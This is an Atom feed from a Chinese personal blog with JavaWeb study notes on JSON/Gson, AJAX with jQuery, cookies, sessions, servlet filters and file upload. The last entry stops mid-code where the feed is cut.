<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggy的个人博客</title>
  
  <subtitle>hello,world.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://ggyggy666.github.io/"/>
  <updated>2021-05-31T10:49:47.114Z</updated>
  <id>https://ggyggy666.github.io/</id>
  
  <author>
    <name>ggy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaWeb学习(9)</title>
    <link href="https://ggyggy666.github.io/2021/05/31/JavaWeb%E5%AD%A6%E4%B9%A0-9/"/>
    <id>https://ggyggy666.github.io/2021/05/31/JavaWeb%E5%AD%A6%E4%B9%A0-9/</id>
    <published>2021-05-31T07:16:14.000Z</published>
    <updated>2021-05-31T10:49:47.114Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习JavaWeb的JSON和AJAX。</p><a id="more"></a><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON是客户端与服务器之间进行数据交换的一种格式。它使用的是大括号，然后里面是键值对，每个键值对之间使用,分割。</p><h2 id="在JavaSctipt中"><a href="#在JavaSctipt中" class="headerlink" title="在JavaSctipt中"></a>在JavaSctipt中</h2><p>首先新建一个新的模块Json_Ajax, 然后在web目录下新建一个json.html。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var JsonObj &#x3D; &#123;</span><br><span class="line">        &quot;key1&quot;:1,</span><br><span class="line">        &quot;key2&quot;:&quot;2&quot;,</span><br><span class="line">        &quot;key3&quot;:true,</span><br><span class="line">        &quot;key4&quot;:[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],</span><br><span class="line">        &quot;key5&quot;:&#123;</span><br><span class="line">            &quot;key_1&quot;:11,</span><br><span class="line">            &quot;key_2&quot;:&quot;12&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;key6&quot;:[&#123;</span><br><span class="line">            &quot;key6_1&quot;:61,</span><br><span class="line">            &quot;key6_2&quot;:&quot;62&quot;</span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            &quot;key6_3&quot;:63,</span><br><span class="line">            &quot;key6_4&quot;:&quot;64&quot;</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>键都是字符串, 值可以是整数、字符串、数组、JSON对象，数组里面也可以是JSON对象。</p><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JsonObj.key1;</span><br><span class="line">JsonObj.key4[0];</span><br><span class="line">JsonObj.key5.key_1;</span><br><span class="line">JsonObj.key6[0].key6_1;</span><br></pre></td></tr></table></figure><p>JSON类型是对象。所以可以用点来访问。</p><p><strong>JSON对象与字符串转化</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var JsonString &#x3D; JSON.stringify(JsonObj);</span><br><span class="line">    var Json &#x3D; JSON.parse(JsonString);</span><br><span class="line">    Json.key_1;</span><br></pre></td></tr></table></figure><p>JSON.stringify(对象)：将JSON对象转换成字符串。</p><p>JSON.parse(字符串)：将JSON字符串转成JSON对象。</p><h2 id="在Java中"><a href="#在Java中" class="headerlink" title="在Java中"></a>在Java中</h2><p>有三种转换。</p><h3 id="JavaBean和Json的转换"><a href="#JavaBean和Json的转换" class="headerlink" title="JavaBean和Json的转换"></a>JavaBean和Json的转换</h3><p>JavaBean其实就是一个类的实例。需要使用到gson-xxx.jar包。在工程目录下新建一个Lib库，将jar包加载进来。然后在src下新建package，新建一个Person类。</p><p>Person类里有id和name两个变量，然后生成构造函数、Getter and Setter, toString方法。</p><p>之后新建一个JsonTest类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class JsonTest &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        Person person &#x3D; new Person(1, &quot;ggy&quot;);</span><br><span class="line">        Gson gson &#x3D; new Gson();</span><br><span class="line">        String s &#x3D; gson.toJson(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        Person person1 &#x3D; gson.fromJson(s, Person.class);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意使用@Test, 会产生一个警告，然后将jUtil加载进来就行了。</p><p>首先需要生成Gson对象。</p><ul><li>gson.toJson(对象)，将对象转换成Json字符串。</li><li>gson.fromJson(Json字符串, 原来的类型)，注意是Person.class。将字符串转换成原来的对象类型。</li></ul><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;ggy&quot;&#125;</span><br><span class="line">Person&#123;id&#x3D;1, name&#x3D;&#39;ggy&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="List和Json的转换"><a href="#List和Json的转换" class="headerlink" title="List和Json的转换"></a>List和Json的转换</h3><p>将List类型转换成Json字符串与上面的一致，但是从Json字符串转成List类型，而且List里面的值是Person类型就不一样了。</p><p>首先新建一个test1函数，创建一个List集合，里面值类型是Person对象，然后使用add函数，将实例化后的Person添加进来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">  public void test1()&#123;</span><br><span class="line">      List&lt;Person&gt; list &#x3D; new ArrayList&lt;Person&gt;();</span><br><span class="line">      list.add(new Person(1,&quot;ggy&quot;));</span><br><span class="line">      list.add(new Person(2, &quot;ggg&quot;));</span><br><span class="line"></span><br><span class="line">      Gson gson &#x3D; new Gson();</span><br><span class="line">      String s &#x3D; gson.toJson(list);</span><br><span class="line">      System.out.println(s);</span><br><span class="line"></span><br><span class="line">      List&lt;Person&gt; o &#x3D; gson.fromJson(s, new PersonList().getType());</span><br><span class="line">      System.out.println(o);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>之后新建一个Gson对象，使用toJson将list转换成Json字符串。但是反过来时，首先需要新建一个类Person List</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public class PersonList extends TypeToken&lt;List&lt;Person&gt;&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它只需要继承TypeToken即可，&lt;&gt;里面是list的类型。大括号里面不用写任何东西。TypeToken是Gson.jar包提供的。</p><p>之后直接使用fromJson</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Person&gt; o &#x3D; gson.fromJson(s, new PersonList().getType());</span><br></pre></td></tr></table></figure><p>类型的话，就需要先new那个PersonList类，然后调用getType方法即可。</p><h3 id="Map和JSON的转换"><a href="#Map和JSON的转换" class="headerlink" title="Map和JSON的转换"></a>Map和JSON的转换</h3><p>跟List差不多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">   public void test2()&#123;</span><br><span class="line">       Map&lt;Integer, Person&gt; map &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">       map.put(1, new Person(1, &quot;ggy&quot;));</span><br><span class="line">       map.put(2, new Person(2, &quot;ggg&quot;));</span><br><span class="line"></span><br><span class="line">       Gson gson &#x3D; new Gson();</span><br><span class="line">       String s &#x3D; gson.toJson(map);</span><br><span class="line">       System.out.println(s);</span><br><span class="line"></span><br><span class="line">       Map&lt;Integer, Person&gt; o &#x3D; gson.fromJson(s, new PersonMap().getType());</span><br><span class="line">       System.out.println(o.get(1));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>每次要将JSON转成List或者Map时，都要新建一个类去继承TypeToken, 因此可以使用匿名类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Integer, Person&gt; o &#x3D; gson.fromJson(s, new TypeToken&lt;Map&lt;Integer, Person&gt;&gt;()&#123;&#125;.getType());</span><br></pre></td></tr></table></figure><p>直接newTypeToken，(){}必不可少。</p><h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><p>Ajax，浏览器通过js异步发起请求，局部动态更新页面。</p><h2 id="原生JS使用"><a href="#原生JS使用" class="headerlink" title="原生JS使用"></a>原生JS使用</h2><p>首先新建一个html文件。有一个按钮和一个div标签，点击按钮就调用ajax函数，发起一个ajax请求，然后将获得的返回数据输出到div标签中。</p><p><img src="https://i.loli.net/2021/05/31/WoZeaxiPYwfF6br.png" alt="image-20210531173450553"></p><p>因为客户端与服务器交换的数据类型是JSON的，因此接收到之后，使用JSON.parse将其变为JSON对象，然后访问里面的键即可。</p><p>服务器端，新建一个AjaxServlet</p><p><img src="https://i.loli.net/2021/05/31/ecsD8MQEPqFO2Lg.png" alt="image-20210531173701032"></p><p>自己创建一个JSON字符串，然后返回。本来是想用创建一个Person对象，然后使用Gson将其转换成JSON字符串的，但是不知为什么没有办法将转换之后的JSON字符串输出来。。。</p><h2 id="JQuery使用"><a href="#JQuery使用" class="headerlink" title="JQuery使用"></a>JQuery使用</h2><p>1.$.ajax 方法</p><ul><li>url: 请求的地址</li><li>type:  请求的类型，GET、POST</li><li>data:  发送的数据，可以有两种格式：name=value&amp;name=value, 或者：{key：value}</li><li>success: 请求成功，响应的回调函数。</li><li>dataType:  响应的数据类型：text, 纯文本；xml，xml数据；json，json对象。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">url: xxx,</span><br><span class="line">type: GET,</span><br><span class="line">data: name&#x3D;value,</span><br><span class="line">success: function(data)&#123;&#x2F;&#x2F;函数必须有个参数，表示返回来的东西。</span><br><span class="line">alert(data);</span><br><span class="line">&#125;,</span><br><span class="line">dataType: json,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>2.$.get方法和$.post方法</p><p>有四个参数，url, data, success, dataType。已经封装好了，直接传值即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$.get(url, data, success, type);</span><br><span class="line">$.get(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&quot;, &quot;function(data)&#123;alert(data);&#125;&quot;, &quot;text&quot;);</span><br></pre></td></tr></table></figure><p>post也一样。</p><p>3.getJSON方法</p><p>get请求，返回JSON对象，因此只有三个参数了。url, data, success。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(url, data, success);</span><br><span class="line">$.getJSON(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&quot;, &quot;function(data)&#123;alert(data);&#125;&quot;)</span><br></pre></td></tr></table></figure><p>3.serialize方法</p><p>上面的data传的都是自己写固定的值，如果需要获取表单中的所有提交的键值对并拼接成name=value&amp;name2=value2，就需要使用serialize方法。</p><p>表单的id为form1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data &#x3D; $&#123;&quot;#form1&quot;&#125;.serialize()即可得到。</span><br><span class="line">$.getJSON(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&amp;&quot;+data, &quot;function()&#123;&#125;&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习JavaWeb的JSON和AJAX。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(8)</title>
    <link href="https://ggyggy666.github.io/2021/05/16/JavaWeb%E5%AD%A6%E4%B9%A0-8/"/>
    <id>https://ggyggy666.github.io/2021/05/16/JavaWeb%E5%AD%A6%E4%B9%A0-8/</id>
    <published>2021-05-16T02:55:31.000Z</published>
    <updated>2021-05-31T05:11:07.057Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习Cookie和Session和Filter过滤器。</p><a id="more"></a><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>Cookie是服务器发送给客户端保存的一组组键值对，客户端传输数据给服务端时都要带上cookie，用来标识客户端。cookie大小不能超过4KB。</p><h2 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h2><p>首先创建CreateCookie类，doGet方法中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String action &#x3D; req.getParameter(&quot;action&quot;);</span><br><span class="line">if (&quot;createCookie&quot;.equals(action))&#123;</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">        resp.getWriter().write(&quot;Success!&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>注意，字符串判断相等使用equals函数，不要直接使用==，不然没办法判断相等。</p><p>然后创建一个Cookie.jsp，里面写上一个a标签跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;cookie?action&#x3D;createCookie&quot;&gt;创建Cookie&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>在web.xml里面配置CreateCookie类的路径是/cookie，重新部署，访问jsp。</p><h2 id="服务端获取Cookie"><a href="#服务端获取Cookie" class="headerlink" title="服务端获取Cookie"></a>服务端获取Cookie</h2><p>cookie保存在客户端，每次发送请求都会发送cookie。服务器获取cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">else if(&quot;getCookie&quot;.equals(action))&#123;</span><br><span class="line">            Cookie[] cookies &#x3D; req.getCookies();</span><br><span class="line">            for(Cookie cookie : cookies)&#123;</span><br><span class="line">                resp.getWriter().write(&quot;Key: &quot;+cookie.getName()+&quot;, value: &quot;+cookie.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>只能通过req对象的getCookies方法获取Cookie数组，而不能获得某个Cookie的键值对。也不能通过某个Key获得相应的值。jsp页面中加一个a标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;cookie?action&#x3D;getCookie&quot;&gt;获取Cookie&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h2 id="修改Cookie"><a href="#修改Cookie" class="headerlink" title="修改Cookie"></a>修改Cookie</h2><p>修改Cookie也很简单，只需要重新new 一个相同key的Cookie对象，值改为新值，然后添加进Cookie即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else if(&quot;updateCookie&quot;.equals(action))&#123;</span><br><span class="line">            Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;);</span><br><span class="line">            resp.addCookie(cookie);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>然后jsp中增加a标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;cookie?action&#x3D;updateCookie&quot;&gt;修改Cookie&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>访问jsp页面，点击即可。</p><h2 id="Cookie存活时间"><a href="#Cookie存活时间" class="headerlink" title="Cookie存活时间"></a>Cookie存活时间</h2><p>先获取cookie对象，然后使用setMaxAge方法设置存活时间。</p><ul><li>正数：表示Cookie在多少秒后销毁。</li><li>-1：表示浏览器关闭就销毁，因此显示是session。</li><li>0：表示马上销毁</li></ul><p>默认是-1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;);</span><br><span class="line">            cookie.setMaxAge(-1);</span><br><span class="line">            resp.addCookie(cookie);</span><br></pre></td></tr></table></figure><h2 id="Cookie的path属性"><a href="#Cookie的path属性" class="headerlink" title="Cookie的path属性"></a>Cookie的path属性</h2><p>可以过滤哪些cookie可以发送给服务器</p><p><img src="/2021/05/16/JavaWeb%E5%AD%A6%E4%B9%A0-8/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210516214719722.png" alt="image-20210516214719722"></p><p>要符合path路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;);</span><br><span class="line">cookie.setPath(req.getContextPath()+&quot;&#x2F;abc&quot;);</span><br><span class="line">resp.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>req.getContextPath()可以获得当前工程路径，后面加了个/abc, 说明Cookie必须在访问<code>/工程路径/abc</code>下的页面时才会发送。</p><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>Session保存在服务器，用来保存客户端的状态，一个客户端一个Session。</p><h2 id="创建和获取Session"><a href="#创建和获取Session" class="headerlink" title="创建和获取Session"></a>创建和获取Session</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HttpSession session &#x3D; req.getSession();</span><br><span class="line">boolean aNew &#x3D; session.isNew();</span><br><span class="line">if(aNew)&#123;</span><br><span class="line">System.out.println(&quot;Session is New&quot;);</span><br><span class="line">&#125;</span><br><span class="line">String id &#x3D; session.getId();</span><br><span class="line">System.out.println(id);</span><br></pre></td></tr></table></figure><p>首先创建Session对象。创建和获取都是使用getSession()函数，那怎么判断它是创建还是获取呢？使用session.isNew()，返回true就代表创建，false代表获取。然后使用session.getId()可以获取sessionID。</p><h2 id="往Session域存取数据"><a href="#往Session域存取数据" class="headerlink" title="往Session域存取数据"></a>往Session域存取数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">req.getSession().setAttribute(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">req.getSession().getAttribute(&quot;key1&quot;);</span><br></pre></td></tr></table></figure><h2 id="Session存活时间"><a href="#Session存活时间" class="headerlink" title="Session存活时间"></a>Session存活时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.getSession().getMaxInactiveInterval();</span><br></pre></td></tr></table></figure><p>获取存活时间间隔，没有设置的话就是获取默认的存活时间是30分钟。然后在web.xml中可以全局配置默认的存活时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-config&gt;</span><br><span class="line">        &lt;session-timeout&gt;20&lt;&#x2F;session-timeout&gt;</span><br><span class="line">&lt;&#x2F;session-config&gt;</span><br></pre></td></tr></table></figure><p>存活时间是20分钟。注意这个存活时间是两次请求的间隔时间。</p><p>设置时间间隔（秒）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.getSession().setMaxInactiveInterval(3);</span><br></pre></td></tr></table></figure><p>存活时间是3秒。如果是负数，则永不超时。</p><p>设置立即无效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.getSession().invalidate();</span><br></pre></td></tr></table></figure><h1 id="Cookie与Session的组合"><a href="#Cookie与Session的组合" class="headerlink" title="Cookie与Session的组合"></a>Cookie与Session的组合</h1><p>首先，浏览器第一次请求服务器，这时候没有session和cookie。然后服务器创建一个session对象，同时生成相应的sessionID，然后将这个sessionID作为值与JSESESSIONID组合成键值对，保存到cookie中。服务器将cookie发送回客户端。之后的请求客户端都会发送cookie，服务器接收到后，解析cookie获得sessionID值，然后找到服务器中保存的sessionID对应的session对象，之后处理。</p><h1 id="Filter过滤器"><a href="#Filter过滤器" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h1><p>用于过滤请求，进行权限管理。</p><p>新建一个Filter工程，然后在web目录下新建一个admin目录，在该目录下新建admin.jsp, 部署访问：<a href="http://localhost:8080/Filter/admin/admin.jsp。此时可以访问。" target="_blank" rel="noopener">http://localhost:8080/Filter/admin/admin.jsp。此时可以访问。</a></p><p>但是admin目录下，我们必须要让admin登陆之后才能访问这个页面，就需要配置Filter过滤器了。</p><p>Filter过滤器会拦截请求，根据doFilter函数中的代码进行权限校验。</p><h2 id="Filter过滤器-1"><a href="#Filter过滤器-1" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h2><p>首先在src目录下新建一个包，然后新建一个AdminFilter类。</p><p><img src="https://i.loli.net/2021/05/31/SN4TIzdOEoGgcDP.png" alt="image-20210531105735121"></p><p>该类实现Filter类，注意，Filter类在很多包里面都有，因此需要选择java.servlet的。然后在dofilter函数中编写校验代码。</p><p>首先拦截http请求，为了获取session域中的数据，需要先将servletRequest强制转换成HttpServletRequest，然后调用getSession获取session对象，再获取username的值。类型是Object哦。之后判断如果user为空，说明没有登陆，就将请求转发到login.jsp登陆界面。否则，说明登陆了，就使用filterChain.doFilter放行请求，继续访问原来要访问的资源。如果没有这句话，请求就会被丢弃，访问是一片空白。</p><p>当然需要在web.xml中配置</p><p><img src="https://i.loli.net/2021/05/31/uQxTcF1W6CS7Ptb.png" alt="image-20210531110227479"></p><p>该Filter过滤器只过滤要访问admin目录下所有资源的请求。之后部署访问即可，发现跳转到了登陆界面。</p><h2 id="加上用户登陆"><a href="#加上用户登陆" class="headerlink" title="加上用户登陆"></a>加上用户登陆</h2><p>新建一个Sevlet包，新建一个LoginServlet类。</p><p><img src="https://i.loli.net/2021/05/31/It5BuwDZnE8GUeV.png" alt="image-20210531112152890"></p><p>然后配置web.xml</p><p><img src="https://i.loli.net/2021/05/31/eRXnsyCvHdN5oMq.png" alt="image-20210531111556509"></p><p>之后login.jsp写一个表单</p><p><img src="https://i.loli.net/2021/05/31/LXCGx15tzDHrhac.png" alt="image-20210531112217710"></p><p>action中写工程名和servlet路径。</p><p>因此，流程如下：login.jsp输入账户密码后，登陆，请求先提交给login即LoginServlet类，检查账户密码是否正确，如果正确，那么获取session对象，设置用户数据。之后访问admin下的admin.jsp时，请求会被Filter过滤器拦截，判断出session域下的用户名存在，说明登陆成功了，那么放行请求，即可访问到admin.jsp。</p><h2 id="Filter的生命周期"><a href="#Filter的生命周期" class="headerlink" title="Filter的生命周期"></a>Filter的生命周期</h2><p>1.构造函数，当启动web工程时就执行。</p><p>2.init初始化，当启动web工程时就执行。</p><p>3.doFilter方法，每次拦截到请求，就执行。</p><p>4.destroy方法，当停止web工程时就执行。</p><h2 id="FilterConfig类"><a href="#FilterConfig类" class="headerlink" title="FilterConfig类"></a>FilterConfig类</h2><p>在Filter过滤器的类中的init函数</p><p><img src="https://i.loli.net/2021/05/31/IqLEsN9r6bSxoZV.png" alt="image-20210531113449468"></p><p>FilterConfig有三个功能，获取Filter的名称，获取Filter的配置参数，获取servletContext上下文对象。</p><p>然后在web.xml中配置init-param</p><p><img src="https://i.loli.net/2021/05/31/aLVfESPd18cIKFA.png" alt="image-20210531113611187"></p><p>需要放在filter中。之后重新部署即可。</p><h2 id="filterChain类"><a href="#filterChain类" class="headerlink" title="filterChain类"></a>filterChain类</h2><p>过滤器链，对同一个url资源可以配置多个过滤器，它们的工作流程如下：</p><p><img src="https://i.loli.net/2021/05/31/GOEKvPhuS8ad92z.png" alt="image-20210531130141537"></p><p>其实就是一个过滤器拦截请求后，使用filterChain放行后，下一个过滤器又拦截了。</p><h2 id="Filter拦截路径"><a href="#Filter拦截路径" class="headerlink" title="Filter拦截路径"></a>Filter拦截路径</h2><ul><li>精确匹配：<code>&lt;url-pattern&gt;/admin.jsp&lt;/url-pattern&gt;</code>, 匹配到的是工程路径下的admin.jsp。</li><li>目录匹配：<code>&lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;</code>, 匹配到的是当前工程路径下的admin目录下的所有文件。</li><li>后缀匹配：<code>&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</code>, 注意不能有/, 匹配到的是当前工程路径下的以jsp结尾的文件。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习Cookie和Session和Filter过滤器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(7)</title>
    <link href="https://ggyggy666.github.io/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/"/>
    <id>https://ggyggy666.github.io/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/</id>
    <published>2021-05-15T13:09:44.000Z</published>
    <updated>2021-05-15T15:37:46.943Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习文件上传和下载。</p><a id="more"></a><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传，需要前后端操作处理。前端上传，后端处理数据。</p><h2 id="前端上传"><a href="#前端上传" class="headerlink" title="前端上传"></a>前端上传</h2><p>写上传代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;upload&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    用户名：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot;&gt;&lt;br&gt;</span><br><span class="line">    头像：&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;photo&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>enctype类型是multipart/form-data, 代表文件是多段上传，而且上传的是二进制流数据。</p><h2 id="后端处理"><a href="#后端处理" class="headerlink" title="后端处理"></a>后端处理</h2><p>首先得看一下文件上传时的请求包</p><p><img src="/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210515212918146.png" alt="image-20210515212918146"></p><p>使用boundary作为分割，将每一个input表单项分开。上传的文件数据是二进制流格式，因此需要使用读取输入流的方式。</p><p>写后端处理程序UploadServlet</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 